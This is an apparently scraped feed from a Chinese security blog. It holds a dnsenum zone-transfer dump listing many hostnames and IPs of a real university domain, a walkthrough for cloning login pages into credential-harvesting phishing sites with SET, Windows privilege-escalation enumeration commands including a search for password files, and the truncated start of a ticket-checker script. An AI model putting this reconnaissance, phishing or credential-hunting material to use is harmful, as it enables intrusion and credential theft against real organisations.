<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line">root@EvilCLAY:~<span class="comment"># dnsenum tjut.edu.cn</span></span><br><span class="line">dnsenum.pl VERSION:1.2.3</span><br><span class="line"></span><br><span class="line">-----   tjut.edu.cn   -----</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Host<span class="string">'s addresses:</span><br><span class="line">__________________</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Name Servers:</span><br><span class="line">______________</span><br><span class="line"></span><br><span class="line">dns1.tjut.edu.cn.                        3600     IN    A        59.67.148.5</span><br><span class="line">dns.tjut.edu.cn.                         3600     IN    A        202.113.64.3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mail (MX) Servers:</span><br><span class="line">___________________</span><br><span class="line"></span><br><span class="line">mail.tjut.edu.cn.                        57168    IN    A        59.67.148.8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Trying Zone Transfers and getting Bind Versions:</span><br><span class="line">_________________________________________________</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Trying Zone Transfer for tjut.edu.cn on dns1.tjut.edu.cn ... </span><br><span class="line">AXFR record query failed: RCODE from server: REFUSED</span><br><span class="line"></span><br><span class="line">Trying Zone Transfer for tjut.edu.cn on dns.tjut.edu.cn ... </span><br><span class="line">tjut.edu.cn.                             86400    IN    SOA      tjut.edu.cn.</span><br><span class="line">tjut.edu.cn.                             86400    IN    NS       dns.tjut.edu.cn.</span><br><span class="line">tjut.edu.cn.                             86400    IN    NS       dns1.tjut.edu.cn.</span><br><span class="line">tjut.edu.cn.                             86400    IN    MX               10</span><br><span class="line">acm.tjut.edu.cn.                         86400    IN    A        59.67.152.15</span><br><span class="line">ccs.tjut.edu.cn.                         86400    IN    A        59.67.148.196</span><br><span class="line">ceping.tjut.edu.cn.                      86400    IN    A        202.113.65.3</span><br><span class="line">ChinaSecEdu2012.tjut.edu.cn.             86400    IN    A        59.67.152.66</span><br><span class="line">chinese.tjut.edu.cn.                     86400    IN    A        202.113.64.2</span><br><span class="line">clsyzx.tjut.edu.cn.                      86400    IN    A        202.113.64.2</span><br><span class="line">cs.tjut.edu.cn.                          86400    IN    A        59.67.152.3</span><br><span class="line">cstp.tjut.edu.cn.                        86400    IN    A        202.113.65.25</span><br><span class="line">dns.tjut.edu.cn.                         86400    IN    A        202.113.64.3</span><br><span class="line">dns1.tjut.edu.cn.                        86400    IN    A        59.67.148.5</span><br><span class="line">dpstar.tjut.edu.cn.                      86400    IN    A        59.67.148.196</span><br><span class="line">eie.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">englishzs.tjut.edu.cn.                   86400    IN    A        202.113.64.2</span><br><span class="line">gcxl.tjut.edu.cn.                        86400    IN    A        59.67.148.89</span><br><span class="line">gjjl.tjut.edu.cn.                        86400    IN    A        202.113.64.2</span><br><span class="line">gmis.tjut.edu.cn.                        86400    IN    A        59.67.148.92</span><br><span class="line">gzc.tjut.edu.cn.                         86400    IN    A        202.113.64.50</span><br><span class="line">ha.tjut.edu.cn.                          86400    IN    A        202.113.64.2</span><br><span class="line">hqc.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">hr.tjut.edu.cn.                          86400    IN    A        59.67.148.196</span><br><span class="line">huagong.tjut.edu.cn.                     86400    IN    A        202.113.64.2</span><br><span class="line">itil.tjut.edu.cn.                        86400    IN    A        59.67.148.196</span><br><span class="line">itil.tjut.edu.cn.                        86400    IN    A        59.67.148.197</span><br><span class="line">jbg.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">jbw.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">jcw.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">jgdw.tjut.edu.cn.                        86400    IN    A        202.113.64.2</span><br><span class="line">jgh.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">jgz.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">jj.tjut.edu.cn.                          86400    IN    A        202.113.64.2</span><br><span class="line">jjc.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">jlt.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">jsjch.tjut.edu.cn.                       86400    IN    A        202.113.64.2</span><br><span class="line">jtw.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">jtz.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">jw.tjut.edu.cn.                          86400    IN    A        202.113.64.2</span><br><span class="line">jwgl.tjut.edu.cn.                        86400    IN    A        59.67.148.195</span><br><span class="line">jwgl.tjut.edu.cn.                        86400    IN    A        59.67.148.201</span><br><span class="line">jwgl.tjut.edu.cn.                        86400    IN    A        59.67.148.202</span><br><span class="line">jy.tjut.edu.cn.                          86400    IN    A        59.67.148.217</span><br><span class="line">jyweb.tjut.edu.cn.                       86400    IN    A        59.67.148.217</span><br><span class="line">jyzx.tjut.edu.cn.                        86400    IN    A        59.67.148.65</span><br><span class="line">jzz.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">kczx.tjut.edu.cn.                        86400    IN    A        59.67.148.86</span><br><span class="line">kjc.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">kygl.tjut.edu.cn.                        86400    IN    A        172.16.100.58</span><br><span class="line">lib.tjut.edu.cn.                         86400    IN    A        202.113.68.3</span><br><span class="line">idp.lib.tjut.edu.cn.                     86400    IN    A        202.113.68.153</span><br><span class="line">libm.tjut.edu.cn.                        86400    IN    A        202.113.68.12</span><br><span class="line">lx.tjut.edu.cn.                          86400    IN    A        59.67.148.217</span><br><span class="line">lxszs.tjut.edu.cn.                       86400    IN    A        202.113.64.2</span><br><span class="line">lxy.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">lxyz.tjut.edu.cn.                        86400    IN    A        202.113.64.2</span><br><span class="line">mail.tjut.edu.cn.                        86400    IN    A        59.67.148.8</span><br><span class="line">mater.tjut.edu.cn.                       86400    IN    A        202.113.64.2</span><br><span class="line">mconsole.tjut.edu.cn.                    86400    IN    A        59.67.148.218</span><br><span class="line">me.tjut.edu.cn.                          86400    IN    A        202.113.64.2</span><br><span class="line">mfile.tjut.edu.cn.                       86400    IN    A        59.67.148.218</span><br><span class="line">mobileapp.tjut.edu.cn.                   86400    IN    A        59.67.148.218</span><br><span class="line">ms.tjut.edu.cn.                          86400    IN    A        59.67.157.162</span><br><span class="line">ms.tjut.edu.cn.                          86400    IN    A        202.113.64.2</span><br><span class="line">my.tjut.edu.cn.                          86400    IN    A        59.67.148.196</span><br><span class="line">my.tjut.edu.cn.                          86400    IN    A        59.67.148.197</span><br><span class="line">nem.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">news.tjut.edu.cn.                        86400    IN    A        202.113.64.2</span><br><span class="line">*.org.tjut.edu.cn.                       86400    IN    A        202.113.65.230</span><br><span class="line">pay.tjut.edu.cn.                         86400    IN    A        59.67.148.196</span><br><span class="line">pay.tjut.edu.cn.                         86400    IN    A        59.67.148.197</span><br><span class="line">portal.tjut.edu.cn.                      86400    IN    A        59.67.148.196</span><br><span class="line">rsc.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">rzjf.tjut.edu.cn.                        86400    IN    A        192.168.9.2</span><br><span class="line">sclc.tjut.edu.cn.                        86400    IN    A        202.113.64.2</span><br><span class="line">shadu.tjut.edu.cn.                       86400    IN    A        59.67.148.6</span><br><span class="line">sjjx.tjut.edu.cn.                        86400    IN    A        59.67.148.211</span><br><span class="line">ssfw.tjut.edu.cn.                        86400    IN    A        59.67.148.195</span><br><span class="line">ssfw.tjut.edu.cn.                        86400    IN    A        59.67.148.201</span><br><span class="line">stud.tjut.edu.cn.                        86400    IN    TXT          v=spf1</span><br><span class="line">stud.tjut.edu.cn.                        86400    IN    MX                5</span><br><span class="line">stud.tjut.edu.cn.                        86400    IN    MX               10</span><br><span class="line">_dmarc.stud.tjut.edu.cn.                 86400    IN    TXT        v=DMARC1</span><br><span class="line">mail.stud.tjut.edu.cn.                   86400    IN    CNAME    mailhz.qiye.163.com.</span><br><span class="line">pop.stud.tjut.edu.cn.                    86400    IN    CNAME    pophm.qiye.163.com.</span><br><span class="line">smtp.stud.tjut.edu.cn.                   86400    IN    CNAME    smtphm.qiye.163.com.</span><br><span class="line">study.tjut.edu.cn.                       86400    IN    A        59.67.152.62</span><br><span class="line">tccce.tjut.edu.cn.                       86400    IN    A        202.113.64.2</span><br><span class="line">tjedu.tjut.edu.cn.                       86400    IN    A        202.113.65.21</span><br><span class="line">tsgvirt.tjut.edu.cn.                     86400    IN    A        202.113.68.27</span><br><span class="line">tyb.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">vpn.tjut.edu.cn.                         86400    IN    A        59.67.148.6</span><br><span class="line">www.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">www1.tjut.edu.cn.                        86400    IN    A        202.113.64.7</span><br><span class="line">xcb.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">xg.tjut.edu.cn.                          86400    IN    A        59.67.148.196</span><br><span class="line">xg.tjut.edu.cn.                          86400    IN    A        59.67.148.197</span><br><span class="line">xgb.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">xhjj.tjut.edu.cn.                        86400    IN    A        202.113.64.2</span><br><span class="line">xk.tjut.edu.cn.                          86400    IN    A        59.67.148.195</span><br><span class="line">xk.tjut.edu.cn.                          86400    IN    A        59.67.148.200</span><br><span class="line">xk.tjut.edu.cn.                          86400    IN    A        59.67.148.201</span><br><span class="line">xk.tjut.edu.cn.                          86400    IN    A        59.67.148.202</span><br><span class="line">xny.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">xxgk.tjut.edu.cn.                        86400    IN    A        202.113.64.2</span><br><span class="line">xxs.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">yda.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">yfz.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">yhy.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">yjs.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">yjsjx.tjut.edu.cn.                       86400    IN    A        59.67.148.92</span><br><span class="line">yjy.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">yktcx.tjut.edu.cn.                       86400    IN    A        59.67.148.40</span><br><span class="line">yktcz.tjut.edu.cn.                       86400    IN    A        59.67.148.73</span><br><span class="line">ylr.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">yx.tjut.edu.cn.                          86400    IN    A        59.67.148.217</span><br><span class="line">yxh.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">yys.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">yyy.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">zdh.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">zgc.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">zs.tjut.edu.cn.                          86400    IN    A        59.67.148.217</span><br><span class="line">zsb.tjut.edu.cn.                         86400    IN    A        202.113.64.2</span><br><span class="line">ztjy.tjut.edu.cn.                        86400    IN    A        202.113.64.2</span><br><span class="line">zxzf.tjut.edu.cn.                        86400    IN    A        202.113.66.34</span><br><span class="line">zzdy.tjut.edu.cn.                        86400    IN    A        59.67.148.200</span><br><span class="line">zzdy.tjut.edu.cn.                        86400    IN    A        59.67.148.202</span><br><span class="line">zzfw.tjut.edu.cn.                        86400    IN    A        59.67.148.195</span><br><span class="line">zzfw.tjut.edu.cn.                        86400    IN    A        59.67.148.201</span><br><span class="line"></span><br><span class="line">brute force file not specified, bay.</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;DNS-枚举&quot;&gt;&lt;a href=&quot;#DNS-枚举&quot; class=&quot;headerlink&quot; title=&quot;DNS 枚举&quot;&gt;&lt;/a&gt;DNS 枚举&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;NS记录      域名服务器记录 ,记录该域名由哪台域名服务器解析&lt;br&gt;MX记
    
    </summary>
    
    
      <category term="DNS区域传送" scheme="http://www.evilclay.com/tags/DNS%E5%8C%BA%E5%9F%9F%E4%BC%A0%E9%80%81/"/>
    
  </entry>
  
  <entry>
    <title>Social-Engineer-Tool（SET）社会工程学工具包制作钓鱼网站</title>
    <link href="http://www.evilclay.com/2016/10/03/Social-Engineer-Tool%EF%BC%88SET%EF%BC%89%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E5%B7%A5%E5%85%B7%E5%8C%85%E5%88%B6%E4%BD%9C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/"/>
    <id>http://www.evilclay.com/2016/10/03/Social-Engineer-Tool（SET）社会工程学工具包制作钓鱼网站/</id>
    <published>2016-10-02T16:22:06.000Z</published>
    <updated>2016-10-02T17:14:26.388Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>Social-Engineer-Tool 是一个好工具，使用 Python 开发，准备后期深入的挖掘一下，今天俺要拿它的克隆网站功能制作一个钓鱼网站看看效果咋样~</p>
</blockquote>
<h4 id="一、安装最新版-SET-工具"><a href="#一、安装最新版-SET-工具" class="headerlink" title="一、安装最新版 SET 工具"></a>一、安装最新版 SET 工具</h4><ol>
<li><p>从 GitHub上下载最近的安装包并解压(20161003最新是7.3.16版本)</p>
<p> <a href="https://github.com/trustedsec/social-engineer-toolkit/releases" target="_blank" rel="external">https://github.com/trustedsec/social-engineer-toolkit/releases</a></p>
</li>
<li><p>执行 <code>sudo python setup.py install</code> 会安装 SET 以及相关的依赖工具。</p>
</li>
</ol>
<h4 id="二、克隆网站"><a href="#二、克隆网站" class="headerlink" title="二、克隆网站"></a>二、克隆网站</h4><ol>
<li><p>使用 <code>sudo setoolkit</code> 打开 SET 工具</p>
<p> <img src="http://7xku36.com1.z0.glb.clouddn.com/set0.png" alt=""></p>
</li>
<li><p>主菜单选择社会工程学攻击 2</p>
<p> <img src="http://7xku36.com1.z0.glb.clouddn.com/setset00.png" alt=""></p>
</li>
<li><p>因为要做钓鱼攻击，选择3</p>
<p> <img src="http://7xku36.com1.z0.glb.clouddn.com/set1.png" alt=""></p>
</li>
<li><p>这一步选择钓鱼页面的生成方式，选择从指定的网站克隆钓鱼页面 2</p>
<p> <img src="http://7xku36.com1.z0.glb.clouddn.com/set3.png" alt=""></p>
</li>
<li><p>这一步设定钓鱼服务器的 IP 以及需要克隆的页面 URL 地址，我这里使用本机(192.168.1.105)直接作为钓鱼服务器。</p>
<p> <img src="http://7xku36.com1.z0.glb.clouddn.com/set4.png" alt=""></p>
</li>
<li><p>设置好之后会在 钓鱼服务器的 Web 根目录下直接生成钓鱼页面，如下所示:</p>
<p> <img src="http://7xku36.com1.z0.glb.clouddn.com/html1.png" alt=""></p>
</li>
<li><p>html 文件 和 PHP 文件都是用来钓鱼的页面，havester 开头的文件是用来接收用户输入的账户信息，看一下文件的内容：</p>
<ul>
<li><p>index.html 内容：</p>
<p>  <img src="http://7xku36.com1.z0.glb.clouddn.com/html2.png" alt=""></p>
<p>可以看出 把 form 的action 改成 钓鱼网站的接收地址。</p>
</li>
<li><p>post.php  内容：</p>
<p>  <img src="http://7xku36.com1.z0.glb.clouddn.com/php.png" alt=""></p>
<p>就是接收 POST 参数，然后把 POST数据写到文件里。</p>
</li>
</ul>
</li>
</ol>
<h4 id="三、测试效果"><a href="#三、测试效果" class="headerlink" title="三、测试效果"></a>三、测试效果</h4><ol>
<li><p>先看需要钓鱼的真实网站：</p>
<p> <img src="http://7xku36.com1.z0.glb.clouddn.com/formal_login.png" alt=""></p>
<p> 是一个简单的 登录 界面。</p>
</li>
<li><p>使用 SET 工具 克隆后的钓鱼网站页面：</p>
<p> <img src="http://7xku36.com1.z0.glb.clouddn.com/fake_login.png" alt=""></p>
<p> 可以看出 克隆出来的网站除了图标没有意外其他和真实网站一模一样，话说这个SET做钓鱼页面简直省心省力，赞！</p>
</li>
<li><p>在钓鱼页面输了一个账户，密码测试后，钓鱼服务器接收的账户信息：</p>
<p> <img src="http://7xku36.com1.z0.glb.clouddn.com/set5.png" alt=""></p>
</li>
<li><p>随手 克隆了一个FreeBuf 的登录界面，发现克隆出来的效果还是很理想的，左边是 FB 的 右边是克隆出的页面 :)</p>
<p> <img src="http://7xku36.com1.z0.glb.clouddn.com/freebuf.png" alt=""></p>
<blockquote>
<p>参考:<br><a href="https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/User_Manual.pdf" target="_blank" rel="external">https://github.com/trustedsec/social-engineer-toolkit/blob/master/readme/User_Manual.pdf</a><br><a href="http://www.freebuf.com/sectool/73409.html" target="_blank" rel="external">http://www.freebuf.com/sectool/73409.html</a></p>
</blockquote>
</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;Social-Engineer-Tool 是一个好工具，使用 Python 开发，准备后期深入的挖掘一下，今天俺要拿它的克隆网站功能制作一个钓鱼网站看看效果咋样~&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;一、安装最新版-SET-工具&quot;&gt;
    
    </summary>
    
    
      <category term="社工工程学" scheme="http://www.evilclay.com/tags/%E7%A4%BE%E5%B7%A5%E5%B7%A5%E7%A8%8B%E5%AD%A6/"/>
    
      <category term="钓鱼网站" scheme="http://www.evilclay.com/tags/%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/"/>
    
      <category term="SET" scheme="http://www.evilclay.com/tags/SET/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网提权命令收集</title>
    <link href="http://www.evilclay.com/2016/09/27/Windows%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83%E5%91%BD%E4%BB%A4%E6%94%B6%E9%9B%86/"/>
    <id>http://www.evilclay.com/2016/09/27/Windows内网提权命令收集/</id>
    <published>2016-09-26T17:07:24.000Z</published>
    <updated>2016-09-29T14:50:02.256Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、系统信息"><a href="#一、系统信息" class="headerlink" title="一、系统信息"></a>一、系统信息</h3><p>查看系统的各种信息</p>
<pre><code>systeminfo
// 结果返回OS的名称，版本，系统安装时间，启动时间，CPU位数，CPU个数，频率，系统目录，内存大小，安装了多少补丁，网卡
systeminfo | findstr /B /C:&quot;OS 名称&quot;
// 过滤输出 系统名称
// findstr /B 从行的开始进行匹配  /C: 表示匹配字符串
</code></pre><p>识别系统体系架构</p>
<pre><code>echo %PROCESSOR_ARCHITECTURE% 
</code></pre><p>查看所有系统环境变量</p>
<pre><code>SET
</code></pre><p>查看用户的信息</p>
<pre><code>net user xxx
</code></pre><h3 id="二、网络信息"><a href="#二、网络信息" class="headerlink" title="二、网络信息"></a>二、网络信息</h3><p>路由信息</p>
<pre><code>route print
// 查看内网的route信息
</code></pre><p>查看 ARP 缓存表</p>
<pre><code>arp -a
</code></pre><p>查看所有的网络连接</p>
<pre><code>netstat -ano
</code></pre><h3 id="三、应用程序信息"><a href="#三、应用程序信息" class="headerlink" title="三、应用程序信息"></a>三、应用程序信息</h3><p>查看计划任务</p>
<pre><code>chcp 437 // 中文系统需要先设置成美国编码
schtasks /QUERY /fo LIST /v
</code></pre><p>查看服务进程PID</p>
<pre><code>tasklist /SVC
// 在任务资源管理器页面也可以设置查看
</code></pre><p>查看安装的驱动</p>
<pre><code>DRIVERQUERY
</code></pre><p>查看安装的程序以及版本信息</p>
<pre><code>wmic product list brief
// 作为漏洞利用线索
//  在控制面板-卸载程序界面也可以看到相关信息
</code></pre><p>查看服务，进程，启动程序相关信息</p>
<pre><code>wmic service list brief
wmic process list brief
wmic startup list brief
</code></pre><p>查看安装的补丁和时间信息</p>
<pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn
</code></pre><p>查看特定漏洞的补丁信息</p>
<pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KBxxxxxxx&quot;
</code></pre><h3 id="四、-敏感数据文件"><a href="#四、-敏感数据文件" class="headerlink" title="四、 敏感数据文件"></a>四、 敏感数据文件</h3><pre><code>dir /b/s config*  // 当前目录下查找所有文件以config开头的文件
findstr /si password *.xml *.ini *.txt    当前目录下在指定的文件类型中查找指定的字符串
</code></pre><blockquote>
<p>参考<br><a href="http://www.freebuf.com/articles/system/114731.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/114731.html</a></p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;一、系统信息&quot;&gt;&lt;a href=&quot;#一、系统信息&quot; class=&quot;headerlink&quot; title=&quot;一、系统信息&quot;&gt;&lt;/a&gt;一、系统信息&lt;/h3&gt;&lt;p&gt;查看系统的各种信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;systeminfo
// 结果返回OS的名称，版本，系统
    
    </summary>
    
    
      <category term="内网提权" scheme="http://www.evilclay.com/tags/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83/"/>
    
      <category term="Windows运维" scheme="http://www.evilclay.com/tags/Windows%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>12306 余票查询小助手</title>
    <link href="http://www.evilclay.com/2016/09/25/12306-%E4%BD%99%E7%A5%A8%E6%9F%A5%E8%AF%A2%E5%B0%8F%E5%8A%A9%E6%89%8B/"/>
    <id>http://www.evilclay.com/2016/09/25/12306-余票查询小助手/</id>
    <published>2016-09-25T01:55:05.000Z</published>
    <updated>2016-09-25T02:10:40.209Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>本程序循环访问 12306 网站，不停的刷新页面，直到发现配置文件中预定的车次有余票时发送提示邮件并结束程序。</p>
</blockquote>
<h4 id="脚本分析"><a href="#脚本分析" class="headerlink" title="脚本分析"></a>脚本分析</h4><ul>
<li><p>共有两个 py 文件</p>
<ul>
<li>12306.py   // 程序的入口文件</li>
<li>config.py  // 程序的配置文件</li>
</ul>
</li>
<li><p>12306.py 的内容</p>
</li>
</ul>
<p>在这个文件需要配置发送邮件用到的发件人账户和授权码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="comment"># 刷票助手 v0.1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ssl,urllib2</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.utils <span class="keyword">import</span> parseaddr, formataddr</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> Header</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># trains = ['G345','G1905']</span></span><br><span class="line"></span><br><span class="line">seat_dict = &#123;</span><br><span class="line">    <span class="string">'二等座'</span>:<span class="string">'ze_num'</span>,</span><br><span class="line">    <span class="string">'硬卧'</span>:<span class="string">'yw_num'</span>,</span><br><span class="line">    <span class="string">'硬座'</span>:<span class="string">'yz_num'</span></span><br><span class="line">&#125;</span><br><span class="line">seat_name = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据输入判断选择的座位类型</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 